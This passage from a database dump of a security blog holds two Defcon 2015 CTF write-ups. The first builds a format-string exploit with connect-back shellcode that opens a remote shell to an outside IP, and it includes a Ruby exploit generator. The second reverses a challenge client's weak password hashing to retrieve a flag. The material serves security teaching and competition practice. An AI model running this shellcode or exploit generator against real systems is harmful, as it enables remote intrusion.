shell\". I normally wind up Googling for the exact shellcode I want, like \"32-bit Linux connect back shellcode\", and grabbing something that looks legit. That\'s not exactly a great practice in general, because who knows what kind of backdoors there are, but for a CTF it\'s not a big deal (to me, at least :) ).\nBefore we worry about shellcode, though, we have to figure out where to stash it!\nIt turns out, for this level, the stack is executable. That makes life easy - I wrote an exploit that ROPed to mprotect() to make it executable before running the shellcode, then realized that was totally unnecessary.\nSince we can access the buffer with \"%x\" in the format string, it means the buffer is definitely on the stack somewhere. That means we can find it exactly like we found everything else - open up the corefile and start looking at the stack pointer (esp).\nLet\'s use the same exploit as we just used to crash it, but this time we\'ll put some text after that we can search for:\n\r\n$ echo -e \'\\x91\\xc6\\xff\\xff%99x%7$n\\n\'\'\\x4c\\xc1\\xff\\xff\'\'\\x4d\\xc1\\xff\\xff\'\'\\x4e\\xc1\\xff\\xff\'\'\\x4f\\xc1\\xff\\xff\'\'%52x%7$n\'\'%255x%8$n\'\'%255x%9$n\'\'%255x%10$n\'\'AAAAAAAAAAAAAAAAAAAAAAAAAA\' | ./babyecho > /dev/null\r\nSegmentation fault (core dumped)\r\n\r\n$ gdb -q ./babyecho ./core\r\n#0  0x41424344 in ?? ()\r\n(gdb) x/10000xw $esp\r\n0xffffc150:     0x00000003      0x00000000      0x00000000      0x00000000\r\n0xffffc160:     0x00000000      0x00000000      0x00000000      0x00000000\r\n...\r\n0xffffc6c0:     0x39257835      0x32256e24      0x25783535      0x6e243031\r\n0xffffc6d0:     0x41414141      0x41414141      0x41414141      0x41414141\r\n\nThere we go! The shellcode is stored at 0xffffc6d0!\nThat means we need to write \"d0 c6 ff ff\" to the return address.\nWe start, as always, by writing our 16 bytes worth of addresses: \'\\x4c\\xc1\\xff\\xff\'\'\\x4d\\xc1\\xff\\xff\'\'\\x4e\\xc1\\xff\\xff\'\'\\x4f\\xc1\\xff\\xff\' - that\'s the offset each of the 4 bytes of the return address.\nThe first byte we want to write to the return address is 0xd0 (208), which means that after the 16 bytes of addresses we need an additional 208 - 16 = 192 bytes: \'%192x%7$n\'\nThe second byte of our shellcode offset is 0xc6. To go from 0xd0 to 0xc6 we have to wrap around by adding 246 bytes (0xd0 + 246 = 0x01c6): \'%246x%8$n\'\nThe third byte is 0xff. 0xff - 0xc6 = 57: \'%57x%9$n\'\nThe fourth byte is also 0xff, which means we can either do %256x or just nothing: \'%10$n\'.\nPutting it all together, we have:\n\r\n\'\\x4c\\xc1\\xff\\xff\'\'\\x4d\\xc1\\xff\\xff\'\'\\x4e\\xc1\\xff\\xff\'\'\\x4f\\xc1\\xff\\xff\'\'%192x%7$n\'\'%246x%8$n\'\'%57x%9$n\'\'%10$n\'\"$SHELLCODE\"\r\n\nWe have one small problem, though: when we calculated the address of the shellcode earlier, we didn\'t take into account the fact that we were going to wind up changing the format string. Because we changed it, buffer is going to be in a slightly different place. We\'ll solve that the easy way and just pad it with NOPs (no operation - 0x90):\n\r\n\'\\x4c\\xc1\\xff\\xff\'\'\\x4d\\xc1\\xff\\xff\'\'\\x4e\\xc1\\xff\\xff\'\'\\x4f\\xc1\\xff\\xff\'\'%192x%7$n\'\'%246x%8$n\'\'%57x%9$n\'\'%10$n\'\'\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\'\"$SHELLCODE\"\r\n\nNow, let\'s make sure all that\'s working by using either \"\\xcd\\x03\" or \"\\xcc\" as shellcode. These both refer to a debug breakpoint and are really easy to see:\n\r\n$ echo -e \'\\x91\\xc6\\xff\\xff%99x%7$n\\n\'\'\\x4c\\xc1\\xff\\xff\'\'\\x4d\\xc1\\xff\\xff\'\'\\x4e\\xc1\\xff\\xff\'\'\\x4f\\xc1\\xff\\xff\'\'%192x%7$n\'\'%246x%8$n\'\'%57x%9$n\'\'%10$n\'\'\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\'\'\\xcc\' | ./babyecho > /dev/null\r\nTrace/breakpoint trap (core dumped)\r\n\nAwesome! The second test string I always use is \\xeb\\xfe, which causes an infinite loop:\n\r\n$ echo -e \'\\x91\\xc6\\xff\\xff%99x%7$n\\n\'\'\\x4c\\xc1\\xff\\xff\'\'\\x4d\\xc1\\xff\\xff\'\'\\x4e\\xc1\\xff\\xff\'\'\\x4f\\xc1\\xff\\xff\'\'%192x%7$n\'\'%246x%8$n\'\'%57x%9$n\'\'%10$n\'\'\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\'\'\\xeb\\xfe\' | ./babyecho > /dev/null\r\n...nothing happens...\r\n\nI like using those two against the real server to see if things are working. The real server will disconnect you immediately for \"\\xcd\\x03\", and the server will time out with \"\\xeb\\xfe\".\nShellcode\nFor the final step (to exploiting it locally), let\'s grab some shellcode from the Internet.\nThis is some shellcode I\'ve used in the past - it\'s x86, and it connects back to my ip address on port 0x4444 (17476). I\'ve put some additional quotes around the ip address and the port number so they\'re easy to find:\n\r\n\"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\xb0\\x66\\xb3\\x01\\x51\\x6a\\x06\\x6a\\x01\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc6\\xb0\\x66\\x31\\xdb\\xb3\\x02\\x68\"\"\\xce\\xdc\\xc4\\x3b\"\"\\x66\\x68\"\"\\x44\\x44\"\"\\x66\\x53\\xfe\\xc3\\x89\\xe1\\x6a\\x10\\x51\\x56\\x89\\xe1\\xcd\\x80\\x31\\xc9\\xb1\\x03\\xfe\\xc9\\xb0\\x3f\\xcd\\x80\\x75\\xf8\\x31\\xc0\\x52\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x52\\x53\\x89\\xe1\\x52\\x89\\xe2\\xb0\\x0b\\xcd\\x80\"\r\n\nWe replace the \"\\xcc\" or \"\\xeb\\xfe\" with all that muck, and give it a run:\n\r\n$ echo -e \'\\x91\\xc6\\xff\\xff%99x%7$n\\n\'\'\\x4c\\xc1\\xff\\xff\'\'\\x4d\\xc1\\xff\\xff\'\'\\x4e\\xc1\\xff\\xff\'\'\\x4f\\xc1\\xff\\xff\'\'%192x%7$n\'\'%246x%8$n\'\'%57x%9$n\'\'%10$n\'\'\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\'\"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\xb0\\x66\\xb3\\x01\\x51\\x6a\\x06\\x6a\\x01\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc6\\xb0\\x66\\x31\\xdb\\xb3\\x02\\x68\"\"\\xce\\xdc\\xc4\\x3b\"\"\\x66\\x68\"\"\\x44\\x44\"\"\\x66\\x53\\xfe\\xc3\\x89\\xe1\\x6a\\x10\\x51\\x56\\x89\\xe1\\xcd\\x80\\x31\\xc9\\xb1\\x03\\xfe\\xc9\\xb0\\x3f\\xcd\\x80\\x75\\xf8\\x31\\xc0\\x52\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x52\\x53\\x89\\xe1\\x52\\x89\\xe2\\xb0\\x0b\\xcd\\x80\" | ./babyecho > /dev/null\r\n\nMeanwhile, on my server, I\'m listening for connections, and sure enough, a connection comes:\n\r\n$ nc -vv -l -p 17476\r\nlistening on [any] 17476 ...\r\nconnect to [206.220.196.59] from 71-35-121-132.tukw.qwest.net [71.35.121.123] 56307\r\n  pwd\r\n/home/ron/defcon-quals/babyecho\r\nls /\r\napplications-merged\r\nbin\r\nboot\r\ndev\r\netc\r\nhome\r\nlib\r\nlib32\r\nlib64\r\nlost+found\r\nmedia\r\nmnt\r\nopt\r\nproc\r\nroot\r\nrun\r\nsbin\r\nstage3-amd64-20130124.tar.bz2\r\nsys\r\ntmp\r\ntorrents\r\nusr\r\nvar\r\nvmware\r\n\nUsing it against the real server...\nThe biggest difference between what we just did and using this against the real server is that you can\'t run a debugger on the server to grab addresses. Instead, you have to leak a stack address and use a relative offset. That\'s pretty straight forward, though, the format string lets you use \"%x\" to go up and down the stack trivially.\nIt\'s also a huge pain to calculate all the offsets by hand, so here\'s some code I wrote during the competition to generate a format string exploit for you... it should take care of everything:\n\r\ndef create_exploit(writes, starting_offset, prefix = \"\")\r\n  index = starting_offset\r\n  str = prefix\r\n\r\n  addresses = []\r\n  values = []\r\n  writes.keys.sort.each do |k|\r\n    addresses << k\r\n    values << writes[k]\r\n  end\r\n  addresses.each do |a|\r\n    str += [a, a+1, a+2, a+3].pack(\"VVVV\")\r\n  end\r\n\r\n  len = str.length\r\n\r\n  values.each do |v|\r\n    a = (v >>  0) & 0x0FF\r\n    b = (v >>  8) & 0x0FF\r\n    c = (v >> 16) & 0x0FF\r\n    d = (v >> 24) & 0x0FF\r\n\r\n    [a, b, c, d].each do |val|\r\n      count = 257\r\n      len  += 1\r\n      while((len & 0x0FF) != val)\r\n        len   += 1\r\n        count += 1\r\n      end\r\n\r\n      str += \"%#{count}x\"\r\n      str += \"%#{index}$n\"\r\n      index += 1\r\n    end\r\n  end\r\n\r\n  puts(\"Generated a #{str.length}-byte format string exploit:\")\r\n  puts(str)\r\n  puts(str.unpack(\"H*\"))\r\n\r\n  return str\r\nend\r\n\nConclusion\nThat\'s a big, long, fairly detailed explanation of format string bugs.\nBasically, a format string bug lets you read the stack and write to addresses stored on the stack. By using four single-byte writes to consecutive addresses, and carefully wasting just enough bytes in between, you can write an arbitrary value to anywhere in memory.\nBy carefully selecting where to write, you can overwrite the return address.\nIn this particular level, we were able to run shellcode directly from the stack. Ordinarily. I would have looped for somewhere to ROP to, such as using mprotect() to make the stack executable.\nAnd that\'s it!\nPlease leave feedback. I spent a long time writing this, would love to hear what people think!', '\'Defcon Quals 2015\'', 'https://blog.skullsecurity.org/2015/defcon-quals-babyecho-format-string-vulns-in-gory-detail');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (12, 'Defcon Quals: Access Control (simple reverse engineer)', 'Ron Bowes', '2015-5-21', 'Hello all,\nToday\'s post will be another write-up from the Defcon CTF Qualifiers. This one will be the level called \"Access Client\", or simply \"client\", which was a one-point reverse engineering level. This post is going to be mostly about the process I use for reverse engineering crypto-style code - it\'s a much different process than reversing higher level stuff, because each instruction matters and it\'s often extremely hard to follow.\nHaving just finished another level (r0pbaby, I think), and having about an hour left in the competition, I wanted something I could finish quickly. There were two one-point reverse engineering challenges open that we hadn\'t solved: one was 64-bit and written in C++, whereas this one was 32-bit and C and only had a few short functions. The choice was easy. :)\nI downloaded the binary and had a look at its strings. Lots of text-based stuff, such as \"list users\", \"print key\", and \"connection id:\", which I saw as a good sign!\n\nRunning it\nIf you wnat to follow along, I uploaded all my work to my Github page, including a program called server.rb that more or less simulates the server. It\'s written in Ruby, obviously, and simulates all the responses. The real client can\'t actually read the flag from it, though, and I can\'t figure out why (and spent way too much time last night re-reversing the client binary before realizing it doesn\'t matter).\nAnyway, when you run the client, it asks for an ip address:\n\r\n$ ./client\r\nneed IP\r\n\nThe competition gives you a target, so that\'s easy (note that most of this is based on my own server.rb, not the real one, which I re-created from packet captures:\n\r\n$ ./client 52.74.123.29\r\nSocket created\r\nEnter message : Hello\r\nnope...Hello\r\n\nIf you look at a packet capture of this, you\'ll see that a connection is made but nothing is sent or received. Local checks are best checks!\nAll right.. time for some reversing! I open up the client program in IDA, and go straight to the Strings tab (Shift-F12). I immediately see \"Enter message :\" so I double click it and end up here:\n\r\n.rodata:080490F5 ; char aEnterMessage[]\r\n.rodata:080490F5 aEnterMessage   db \'Enter message : \',0 ; DATA XREF: main+178o\r\n.rodata:08049106 aHackTheWorld   db \'hack the world\',0Ah,0 ; DATA XREF: main+1A7o\r\n.rodata:08049116 ; char aNope_[]\r\n.rodata:08049116 aNope___S       db \'nope...%s\',0Ah,0    ; DATA XREF: main+1CAo\r\n\nCould it really be that easy?\nThe answer, for a change, is yes:\n\r\n$ ./client 52.74.123.29\r\nSocket created\r\nEnter message : hack the world\r\n<< connection ID: nuc EW1A IQr^2&\r\n\r\n\r\n*** Welcome to the ACME data retrieval service ***\r\nwhat version is your client?\r\n\r\n<< hello...who is this?\r\n<<\r\n\r\n<< enter user password\r\n\r\n<< hello grumpy, what would you like to do?\r\n<<\r\n\r\n<< grumpy\r\nmrvito\r\ngynophage\r\nselir\r\njymbolia\r\nsirgoon\r\nduchess\r\ndeadwood\r\nhello grumpy, what would you like to do?\r\n\r\n<< the key is not accessible from this account. your administrator has been notified.\r\n<<\r\nhello grumpy, what would you like to do?\r\n\nThen it just sits there.\nI logged the traffic with Wireshark and it looks like this (blue = incoming, red = outgoing, or you can just download my pcap):\n\r\nconnection ID: Je@/b9~A>Xa\'R-\r\n\r\n\r\n*** Welcome to the ACME data retrieval service ***\r\nwhat version is your client?\r\nversion 3.11.54\r\nhello...who is this?grumpy\r\n\r\nenter user password\r\nH0L31\r\nhello grumpy, what would you like to do?\r\nlist users\r\ngrumpy\r\nmrvito\r\ngynophage\r\nselir\r\njymbolia\r\nsirgoon\r\nduchess\r\ndeadwood\r\nhello grumpy, what would you like to do?\r\nprint key\r\nthe key is not accessible from this account. your administrator has been notified.\r\nhello grumpy, what would you like to do?\r\n\nConnection IDs and passwords\nI surmised, based on this, that the connection id was probably random (it looks random) and that the password is probably hashed (poorly) and not replay-able (that\'d be too easy). Therefore, the password is probably based on the connection id.\nTo verify the first part, I ran a capture a second time:\n\r\nconnection ID: #2^1}P>JAqbsaj\r\n[...]\r\nhello...who is this?\r\ngrumpy\r\nenter user password\r\nV/%S:\r\n\nYup, it\'s different!\nI did some quick digging in IDA and found a function - sub_8048EAB - that was called with \"grumpy\" and \"1\" as parameters, as well as a buffer that would be sent to the server. It looked like it did some arithmetic on \"grumpy\" - which is presumably a password, and it touched a global variable - byte_804BC70 - that, when I investigated, turned out to be the connection id. The function was called from a second place, too, but we\'ll get to that later!\nSo now we\'ve found a function that looks at the password and the connection id. That sounds like the hashing function to me (and note that I\'m using the word \"hashing\" in its literal sense, it\'s obviously not a secure hash)! I could have used a debugger to verify that it was actually returning a hashed password, but the clock was ticking and I had to make some assumptions in order to keep moving - if the the assumptions turned out to be wrong, I wouldn\'t have finished the level, but I wouldn\'t have finished it either if I verified everything.\nI wasn\'t entirely sure what had to be done from here, but it seemed logical to me that reverse engineering the password-hashing function was something I\'d eventually have to do. So I got to work, figuring it couldn\'t hurt!\nReversing the hashing function\nThere are lots of ways to reverse engineer a function. Frequently, I take a higher level view of what libc/win32 functions it calls, but sub_8048EAB doesn\'t call any functions. Sometimes I\'ll try to understand the code, mentally, but I\'m not super great at that. So I used a variation of this tried-and-true approach I often use for crypto code:\n\nReverse each line of assembly to exactly one line of C\nTest it against the real version, preferably instrumented so I can automatically ensure that it\'s working properly\nWhile the output of my code is different from the output of their code, use a debugger (on the binary) and printf statements (on your implementation) to figure out where the problem is - this usually takes the most of my time, because there are usually several mistakes\nWith the testing code still in place, simplify the C function as much as you can\n\nBecause I only had about an hour to reverse this, I had to cut corners. I reversed it to Ruby instead of C (so I wouldn\'t have to deal with sockets in C), I didn\'t set up proper instrumentation and instead used Wireshark, and I didn\'t simplify anything till afterwards. In the end, I\'m not sure whether this was faster or slower than doing it \"right\", but it worked so I can\'t really complain.\nVersion 1\nAs I said, the first thing I do is translate the code directly, line by line, to assembly. I had to be a little creative with loops and pointers because I can\'t just use goto and cast everything to an integer like I would in C, but this is what it looked like. Note that I\'ve fixed all the bugs that were in the original version - there were a bunch, but it didn\'t occur to me to keep the buggy code - I did, however, leave in the printf-style statements I used for debugging!\n\r\n# mode = 1 for passwords, 7 for keys\r\ndef hash_password(password, connection_id, mode)\r\n# mov     eax, [ebp+password]\r\n  eax = password\r\n\r\n# mov     [ebp+var_2C], eax\r\n  var_2c = eax\r\n\r\n# mov     eax, [ebp+buffer]\r\n  eax = \"\"\r\n\r\n# mov     [ebp+var_30], eax\r\n  var_30 = \"\"\r\n\r\n# xor     eax, eax\r\n  eax = 0\r\n\r\n# mov     ecx, ds:g_connection_id_plus_7 ; 0x0000007d, but changes\r\n  ecx = connection_id[7]\r\n  #puts(\'%x\' % ecx.ord)\r\n\r\n# mov     edx, 55555556h\r\n  edx = 0x55555556\r\n# mov     eax, ecx\r\n  eax = ecx\r\n# imul    edx\r\n  #puts(\"imul\")\r\n  #puts(\"%x\" % eax.ord)\r\n  #puts(\"%x\" % edx)\r\n  edx = ((eax.ord * edx) >> 32)\r\n  #puts(\"%x\" % edx)\r\n# mov     eax, ecx\r\n  eax = ecx\r\n# sar     eax, 1Fh\r\n  #puts(\"sar\")\r\n  #puts(\"%x\" % eax.ord)\r\n  eax = eax.ord >> 0x1F\r\n  #puts(\"%x\" % eax)\r\n# mov     ebx, edx\r\n  ebx = edx\r\n# sub     ebx, eax\r\n  ebx -= eax\r\n  #puts(\"sub\")\r\n  #puts(\"%x\" % ebx)\r\n# mov     eax, ebx\r\n  eax = ebx\r\n# mov     [ebp+var_18], eax\r\n  var_18 = eax\r\n# mov     edx, [ebp+var_18]\r\n  edx = var_18\r\n# mov     eax, edx\r\n  eax = edx\r\n# add     eax, eax\r\n  eax = eax * 2\r\n# add     eax, edx\r\n  eax = eax + edx\r\n\r\n  #puts(\"\")\r\n  #puts(\"%x\" % eax)\r\n# mov     edx, ecx\r\n  edx = ecx\r\n# sub     edx, eax\r\n  #puts()\r\n  #puts(\"%x\" % ecx.ord)\r\n  #puts(\"%x\" % edx.ord)\r\n  edx = edx.ord - eax\r\n  #puts(\"%x\" % edx)\r\n# mov     eax, edx\r\n  eax = edx\r\n# mov     [ebp+var_18], eax\r\n  var_18 = eax\r\n  #puts()\r\n  #puts(\"%x\" % var_18)\r\n# mov     eax, dword_804B04C\r\n  eax = mode\r\n# add     [ebp+var_18], eax\r\n  var_18 += eax\r\n  #puts(\"%x\" % eax)\r\n# mov     edx, offset g_connection_id ; <--\r\n  edx = connection_id\r\n# mov     eax, [ebp+var_18]\r\n  eax = var_18\r\n# add     eax, edx\r\n# mov     dword ptr [esp+8], 5 ; n\r\n# mov     [esp+4], eax    ; src\r\n# lea     eax, [ebp+dest]\r\n# mov     [esp], eax      ; dest\r\n# call    _strncpy\r\n  dest = connection_id[var_18, 5]\r\n  #puts(dest)\r\n# mov     [ebp+var_1C], 0\r\n  var_1c = 0\r\n\r\n# jmp     short loc_8048F4A\r\n# loc_8048F2A:                            ; CODE XREF: do_password+A3j\r\n  0.upto(4) do |var_1c|\r\n#   mov     eax, [ebp+var_1C]\r\n    eax = var_1c\r\n#   add     eax, [ebp+var_30]\r\n    # XXX\r\n#   lea     edx, [ebp+dest]\r\n    edx = dest\r\n\r\n#   add     edx, [ebp+var_1C]\r\n#   movzx   ecx, byte ptr [edx]\r\n    ecx = edx[var_1c]\r\n#   mov     edx, [ebp+var_1C]\r\n    edx = var_1c\r\n\r\n#   add     edx, [ebp+var_2C]\r\n#   movzx   edx, byte ptr [edx]\r\n    edx = var_2c[var_1c]\r\n\r\n#   xor     edx, ecx\r\n    edx = edx.ord ^ ecx.ord\r\n#   mov     [eax], dl\r\n    edx &= 0x0FF\r\n    var_30[var_1c] = (edx & 0x0FF).chr\r\n\r\n#   add     [ebp+var_1C], 1\r\n#\r\n#   loc_8048F4A:                            ; CODE XREF: do_password+7Dj\r\n#   cmp     [ebp+var_1C], 4\r\n#   jle     short loc_8048F2A\r\n  end\r\n\r\n  #puts()\r\n\r\n  return var_30\r\nend\r\n\nAfter I got it working and returning the same value as the real implementation, I had a problem! The value I returned - even though it matched the real program - wasn\'t quite right! It had a few binary characters in it, whereas the value sent across the network never did. I looked around and found the function - sub_8048F67 - that actually sends the password to the server. It turns out, that function replaces all the low- and high-ASCII characters with proper ones (the added lines are in bold):\n\r\n# mode = 1 for passwords, 7 for keys\r\ndef hash_password(password, connection_id, mode)\r\n# mov     eax, [ebp+password]\r\n  eax = password\r\n\r\n# mov     [ebp+var_2C], eax\r\n  var_2c = eax\r\n\r\n# mov     eax, [ebp+buffer]\r\n  eax = \"\"\r\n\r\n# mov     [ebp+var_30], eax\r\n  var_30 = \"\"\r\n\r\n# xor     eax, eax\r\n  eax = 0\r\n\r\n# mov     ecx, ds:g_connection_id_plus_7 ; 0x0000007d, but changes\r\n  ecx = connection_id[7]\r\n  #puts(\'%x\' % ecx.ord)\r\n\r\n# mov     edx, 55555556h\r\n  edx = 0x55555556\r\n# mov     eax, ecx\r\n  eax = ecx\r\n# imul    edx\r\n  #puts(\"imul\")\r\n  #puts(\"%x\" % eax.ord)\r\n  #puts(\"%x\" % edx)\r\n  edx = ((eax.ord * edx) >> 32)\r\n  #puts(\"%x\" % edx)\r\n# mov     eax, ecx\r\n  eax = ecx\r\n# sar     eax, 1Fh\r\n  #puts(\"sar\")\r\n  #puts(\"%x\" % eax.ord)\r\n  eax = eax.ord >> 0x1F\r\n  #puts(\"%x\" % eax)\r\n# mov     ebx, edx\r\n  ebx = edx\r\n# sub     ebx, eax\r\n  ebx -= eax\r\n  #puts(\"sub\")\r\n  #puts(\"%x\" % ebx)\r\n# mov     eax, ebx\r\n  eax = ebx\r\n# mov     [ebp+var_18], eax\r\n  var_18 = eax\r\n# mov     edx, [ebp+var_18]\r\n  edx = var_18\r\n# mov     eax, edx\r\n  eax = edx\r\n# add     eax, eax\r\n  eax = eax * 2\r\n# add     eax, edx\r\n  eax = eax + edx\r\n\r\n  #puts(\"\")\r\n  #puts(\"%x\" % eax)\r\n# mov     edx, ecx\r\n  edx = ecx\r\n# sub     edx, eax\r\n  #puts()\r\n  #puts(\"%x\" % ecx.ord)\r\n  #puts(\"%x\" % edx.ord)\r\n  edx = edx.ord - eax\r\n  #puts(\"%x\" % edx)\r\n# mov     eax, edx\r\n  eax = edx\r\n# mov     [ebp+var_18], eax\r\n  var_18 = eax\r\n  #puts()\r\n  #puts(\"%x\" % var_18)\r\n# mov     eax, dword_804B04C\r\n  eax = mode\r\n# add     [ebp+var_18], eax\r\n  var_18 += eax\r\n  #puts(\"%x\" % eax)\r\n# mov     edx, offset g_connection_id ; <--\r\n  edx = connection_id\r\n# mov     eax, [ebp+var_18]\r\n  eax = var_18\r\n# add     eax, edx\r\n# mov     dword ptr [esp+8], 5 ; n\r\n# mov     [esp+4], eax    ; src\r\n# lea     eax, [ebp+dest]\r\n# mov     [esp], eax      ; dest\r\n# call    _strncpy\r\n  dest = connection_id[var_18, 5]\r\n  #puts(dest)\r\n# mov     [ebp+var_1C], 0\r\n  var_1c = 0\r\n\r\n# jmp     short loc_8048F4A\r\n# loc_8048F2A:                            ; CODE XREF: do_password+A3j\r\n  0.upto(4) do |var_1c|\r\n#   mov     eax, [ebp+var_1C]\r\n    eax = var_1c\r\n#   add     eax, [ebp+var_30]\r\n    # XXX\r\n#   lea     edx, [ebp+dest]\r\n    edx = dest\r\n\r\n#   add     edx, [ebp+var_1C]\r\n#   movzx   ecx, byte ptr [edx]\r\n    ecx = edx[var_1c]\r\n#   mov     edx, [ebp+var_1C]\r\n    edx = var_1c\r\n\r\n#   add     edx, [ebp+var_2C]\r\n#   movzx   edx, byte ptr [edx]\r\n    edx = var_2c[var_1c]\r\n\r\n#   xor     edx, ecx\r\n    edx = edx.ord ^ ecx.ord\r\n#   mov     [eax], dl\r\n    edx &= 0x0FF\r\n\r\n    #puts(\"before edx = %x\" % edx)\r\n    if(edx < 0x1f)\r\n      #puts(\"a\")\r\n      edx += 0x20\r\n    elsif(edx > 0x7F)\r\n      edx = edx - 0x7E + 0x20\r\n    end\r\n    #puts(\"after edx = %x\" % edx)\r\n\r\n    var_30[var_1c] = (edx & 0x0FF).chr\r\n\r\n#   add     [ebp+var_1C], 1\r\n#\r\n#   loc_8048F4A:                            ; CODE XREF: do_password+7Dj\r\n#   cmp     [ebp+var_1C], 4\r\n#   jle     short loc_8048F2A\r\n  end\r\n\r\n  #puts()\r\n\r\n  return var_30\r\nend\r\n\nAs you can see, it\'s quite long and difficult to follow. But, now that the bugs were fixed, it was outputting the same thing as the real version! I set it up to log in with the username \'grumpy\' and the password \'grumpy\' and it worked great!\nCleaning it up\nI didn\'t actually clean up the code until after the competition, but here\'s the step-by-step cleanup that I did, just so I could blog about it.\nFirst, I removed all the comments:\n\r\ndef hash_password_phase2(password, connection_id, mode)\r\n  eax = password\r\n  var_2c = eax\r\n  eax = \"\"\r\n  var_30 = \"\"\r\n  eax = 0\r\n  ecx = connection_id[7]\r\n  edx = 0x55555556\r\n  eax = ecx\r\n  edx = ((eax.ord * edx) >> 32)\r\n  eax = ecx\r\n  eax = eax.ord >> 0x1F\r\n  ebx = edx\r\n  ebx -= eax\r\n  eax = ebx\r\n  var_18 = eax\r\n  edx = var_18\r\n  eax = edx\r\n  eax = eax * 2\r\n  eax = eax + edx\r\n\r\n  edx = ecx\r\n  edx = edx.ord - eax\r\n  eax = edx\r\n  var_18 = eax\r\n  eax = mode\r\n  var_18 += eax\r\n  edx = connection_id\r\n  eax = var_18\r\n  dest = connection_id[var_18, 5]\r\n  var_1c = 0\r\n\r\n  0.upto(4) do |var_1c|\r\n    eax = var_1c\r\n    edx = dest\r\n    ecx = edx[var_1c]\r\n    edx = var_1c\r\n    edx = var_2c[var_1c]\r\n    edx = edx.ord ^ ecx.ord\r\n    edx &= 0x0FF\r\n    if(edx < 0x1f)\r\n      edx += 0x20\r\n    elsif(edx > 0x7F)\r\n      edx = edx - 0x7E + 0x20\r\n    end\r\n    var_30[var_1c] = (edx & 0x0FF).chr\r\n  end\r\n  return var_30\r\nend\r\n\nThen I started eliminating redundant statements:\n\r\ndef hash_password_phase3(password, connection_id, mode)\r\n  ecx = connection_id[7]\r\n  eax = ecx\r\n  edx = ((eax.ord * 0x55555556) >> 32)\r\n  eax = ecx\r\n  eax = eax.ord >> 0x1F\r\n  eax = ((edx - (eax.ord >> 0x1F)) * 2) + edx\r\n\r\n  edx = ecx\r\n  edx = edx.ord - eax\r\n  eax = edx\r\n  var_18 = eax\r\n  var_18 += mode\r\n  edx = connection_id\r\n  eax = var_18\r\n  dest = connection_id[var_18, 5]\r\n\r\n  result = \"\"\r\n  0.upto(4) do |i|\r\n    eax = i\r\n    edx = dest\r\n    ecx = edx[i]\r\n    edx = password[i]\r\n    edx = edx.ord ^ ecx.ord\r\n    edx &= 0x0FF\r\n    if(edx < 0x1f)\r\n      edx += 0x20\r\n    elsif(edx > 0x7F)\r\n      edx = edx - 0x7E + 0x20\r\n    end\r\n    result << (edx & 0x0FF).chr\r\n  end\r\n\r\n  return result\r\nend\r\n\nRemoved some more redundancy:\n\r\ndef hash_password_phase4(password, connection_id, mode)\r\n  char_7 = connection_id[7].ord\r\n  edx = ((char_7 * 0x55555556) >> 32)\r\n  eax = ((edx - (char_7 >> 0x1F >> 0x1F)) * 2) + edx\r\n\r\n  result = \"\"\r\n  0.upto(4) do |i|\r\n    edx = (password[i].ord ^ connection_id[char_7 - eax + mode + i].ord) & 0xFF\r\n\r\n    if(edx < 0x1f)\r\n      edx += 0x20\r\n    elsif(edx > 0x7F)\r\n      edx = edx - 0x7E + 0x20\r\n    end\r\n    result << (edx & 0x0FF).chr\r\n  end\r\n\r\n  return result\r\nend\r\n\nAnd a final cleanup pass where I eliminated the \"bad paths\" - things that I know can\'t possibly happen:\n\r\ndef hash_password_phase5(password, connection_id, mode)\r\n  char_7 = connection_id[7].ord\r\n\r\n  result = \"\"\r\n  0.upto(4) do |i|\r\n    edx = password[i].ord ^ connection_id[i + char_7 - (((char_7 * 0x55555556) >> 32) * 3) + mode].ord\r\n    if(edx < 0x1f)\r\n      edx += 0x20\r\n    elsif(edx > 0x7F)\r\n      edx = edx - 0x7E + 0x20\r\n    end\r\n    result << edx.chr\r\n  end\r\n\r\n  return result\r\nend\r\n\r\n\nAnd that\'s the final product! Remember, at each step of the way I was testing and re-testing to make sure it worked for a few dozen test strings. That\'s important because it\'s really, really easy to miss stuff.\nThe rest of the level\nNow, getting back to the level...\nAs we saw above, after logging in, the real client sends \"list users\" then \"print key\". \"print key\" fails because the user doesn\'t have administrative rights, so presumably one of the users printed out on the \"list users\" page does.\nI went through and manually entered each user into the program, with the same username as password (seemed like the thing to do, since grumpy\'s password was \"grumpy\") until I reached the user \"duchess\". When I tried \"duchess\", I got the prompt:\n\r\nchallenge: /\\&[$\r\nanswer?\r\n\nWhen I was initially reversing the password hashing, I noticed that the hash_password() function was called a second time near the strings \"challenge:\" and \"answer?\"! The difference was that instead of passing the integer 1 as the mode, it passed 7. So I tried calling hash_password(\'/\\&[$\', connection_id, 7) and got the response, \"<=}-^\".\nI sent that, and the key came back! Here\'s the full session:\n\r\nconnection ID: Tk8)k)e3a[vzN^\r\n\r\n\r\n*** Welcome to the ACME data retrieval service ***\r\nwhat version is your client?\r\nversion 3.11.54\r\nhello...who is this?\r\nduchess\r\nenter user password\r\n/MJ#L\r\nhello duchess, what would you like to do?\r\nprint key\r\nchallenge: /\\&[$\r\nanswer?\r\n<=}-^\r\nthe key is: The only easy day was yesterday. 44564\r\n\nI submitted the key with literally three minutes to 